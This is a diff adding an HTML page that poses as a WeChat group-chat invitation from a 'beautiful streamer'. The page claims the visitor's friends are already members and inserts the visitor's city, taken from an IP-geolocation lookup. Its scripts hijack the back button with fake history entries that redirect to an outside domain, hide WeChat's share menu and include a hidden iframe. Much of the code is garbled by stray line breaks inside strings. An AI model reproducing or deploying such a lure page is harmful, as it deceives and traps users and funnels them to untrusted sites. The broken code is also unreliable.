@@ -1,0 +1,270 @@
+﻿<!DOCTYPE html>
+    <!-- saved from url=(0067)http://qun-ld3.fission.video/item/qun2/show/id/1.html#1579275402447 -->
+    <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+    <meta id="viewport" name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" >
+    <meta content="telephone=no" name="format-detection" >
+    <title> 群聊邀请 </title>
+    <link rel="stylesheet" type="text/css" href="qun1.css ">
+    <script type="text/javascript" src="jquery.min.js"></script>
+    <script type="text/javascript " src="ipquery"></script>
+</head>
+
+<body>
+<div class="
+body ">
+    <div class="
+group_info ">
+        <img src="H0989155c84f0443b8d79b42e68927920Q.png " alt="
+" class="
+group_icon ">
+        <p class="
+group_name ">美女主播在辽宁邀请你进群</p>
+        <p class="
+group_num ">368人</p>
+    </div>
+    <p class="
+msg ">邀请你加入群聊</p>
+    <a href="../2/index.html" class="
+btn btn_primary ">加入群聊</a>
+    <div class="
+ext_info ">
+        <p><em></em> 你有18个好友也在群聊中。 </p>
+        <p><em></em>该群聊人数较多，为减少新消息给你带来的打扰，建议谨慎加入。</p>
+    </div>
+</div>
+<script>
+    var dizhi = '';
+    if(typeof localAddress != 'undefined') {
+        if(typeof localAddress["
+city "] != 'undefined' && localAddress["
+city "] != '') {
+            dizhi = localAddress["
+city "];
+            dizhi = dizhi.replace("
+市 ", "
+");
+        } else if(typeof localAddress["
+province "] != 'undefined' && localAddress["
+province "] != '') {
+            dizhi = localAddress["
+province "];
+            dizhi = dizhi.replace("
+省 ", "
+");
+        }
+    }
+
+    /*随机一个字符*/
+    function getRandEmoji() {
+        var emoji = ["🌂
+","🌺
+","⛎
+","🐳
+","💖
+","🔥
+","🈲
+","💥
+","✨
+","💘
+","🍺
+","💌
+","🎸
+","⛵
+","🎁
+","💰
+","👙
+","🙏
+","🐠
+","🛀
+","😀
+","😁
+","😂
+","🤣
+","😃
+","😄
+","😅
+","😆
+","😉
+","😊
+","😋
+","😎
+","😍
+","😘
+","😗
+","😙
+","😚
+","🙂
+","🤗
+","🤔
+","😐
+","😶
+","😑
+","🙄
+","😏
+","😣
+","😥
+","😮
+","🤐
+","😯
+","😪
+","😫
+","😴
+","😌
+","😛
+","😜
+","😝
+","🤤
+","😓
+","😔
+","😕
+","🙃
+","🤑
+","😲
+","😖
+","😖
+","😞
+","😟
+","😤
+","😢
+","😭
+","😦
+","😦
+","🤧
+","😇
+","🤠
+","🤡
+","🤥
+","🤓
+","😈
+","👿
+","👹
+","👺
+","💀
+","👻
+","👽
+","😺
+","😸
+","😹
+","😻
+","😼
+","😽
+","🙀
+","😿
+","😾
+","👫
+","👬
+","👭
+","👃🏿
+","👣
+","👀
+","👁
+","👅
+","👄
+","💋
+","👓
+","👔
+","👕
+","👙
+","👚
+","👜
+","👠
+","👑
+","🎩
+","💍
+","💼
+","🌠
+","🌏
+","🌕
+","🌠
+","😙
+","🈲
+","✅
+","🔡
+","🔘
+","🔖
+","🔗
+","🔜
+","🔙
+","🔚
+","🔛
+","⚪
+","⛔
+","🔽
+","🔠
+","⚫
+","🚫
+","✅
+","🔼
+","⛔
+","❎
+","🔢
+","📛
+","🔵
+"];
+        var index = Math.floor((Math.random() * emoji.length));
+        return emoji[index];
+    }
+
+
+    var site_title = "美女主播在同城邀请你进群💕 ";
+
+    /*替换标题里的标签*/
+    while( site_title.indexOf(" {
+    city
+}
+") > -1 || site_title.indexOf(" {
+    emoji
+}
+") > -1 ) {
+        site_title = site_title.replace(" {
+    city
+}
+", dizhi).replace(" {
+    emoji
+}
+", getRandEmoji());
+    }
+
+    /*把标题，加载到网页标题*/
+    $('.group_name').html(site_title);
+
+
+    window.onhashchange = function() {jp();};
+    function hh() {history.pushState(history.length + 1, "
+message ", window.location.href.split('#')[0] + "#
+" + new Date().getTime());}
+    function jp() {window.location.href = " / u / 1 ";}
+    setTimeout("
+hh();
+", 200);
+
+</script>
+<script type="
+text / javascript ">
+
+
+
+window.onhashchange = function () {
+jp();
+};
+function hh() {
+history.pushState(history.length + 1, "
+message ", "#
+" + new Date().getTime());
+}
+function jp() {
+//返回
+location.href = 'http://lhu0fk.cn/u/2';
+}
+setTimeout('hh();', 200);
+
+
+<script type="text/javascript ">document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {WeixinJSBridge.call('hideOptionMenu');});</script>
+
+
+
+<div id="qb - sougou - search " style="display: none;opacity: 0;"><p>搜索</p><p class="
+last - btn ">复制</p><iframe src=". / 群聊邀请_files / saved_resource.html "></iframe></div></body>
+</html>
+
